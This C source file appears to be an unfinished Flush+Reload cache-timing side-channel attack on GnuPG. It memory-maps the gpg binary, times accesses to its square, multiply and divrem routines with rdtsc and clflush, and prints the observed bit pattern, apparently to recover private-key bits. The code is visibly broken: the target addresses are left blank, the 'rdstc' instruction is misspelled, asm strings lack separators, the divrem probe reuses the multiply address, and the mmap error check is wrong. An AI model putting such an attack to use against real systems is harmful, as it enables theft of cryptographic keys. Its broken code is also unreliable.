#include <sys/mman.h>
#include "stdio.h"
#include "stdlib.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
unsigned long THRESHOLD = 5;
uint16_t probe(char* addr){
    volatile unsigned long time;
    // read timestamp
    // move timestamp to another reg
    //cpuid
    // mem access
    //cpuid
    // read timestamp
    //cflush

    asm __volatile__(
        "rdtsc\n\t"
        "cpuid"
        "mov %%eax, %%edi\n\t"
        "cpuid"
        "movl (%1), %%eax \n\t"
        "cpuid"
        "rdstc"
        "subl %%edi, %%eax\n\t"
        "movl %%eax, %0\n\t"
        "clflush 0(%1)\n\t"
        :"=r"(time)
        :"r"(addr)
       
    );

    return time < THRESHOLD;
}
void busy_wait(){
    for(int i =0; i<2000; i++){
         asm __volatile__(
        "nop\n\t"
        );
    }
   
}
int main(void){
    int fp = open("/usr/local/bin/gpg", O_RDONLY);
    struct stat statbuf;
    if (fstat (fp,&statbuf) < 0){
        printf ("fstat error");
        return 0;
   }
   char*  file_addr = (char*) mmap(0, statbuf.st_size, PROT_READ, MAP_SHARED, fp, 0);
   if(file_addr < 0){
       printf("error");
    }
   char* sqr_addr= 
   char* mul_addr = 
   char* divrem_addr = 
   
   for(int i=0; i<5000; i++){
       uint16_t sqr = probe(file_addr + sqr_addr);
       uint16_t mul = probe(file_addr + mul_addr);
       uint16_t divrem = probe(file_addr + mul_addr);
       if(sqr && mul && divrem){
           printf("1");
       }else{
           printf("0");
       }
       // busy wait
       busy_wait();
   
       
   }
    return 0;
}

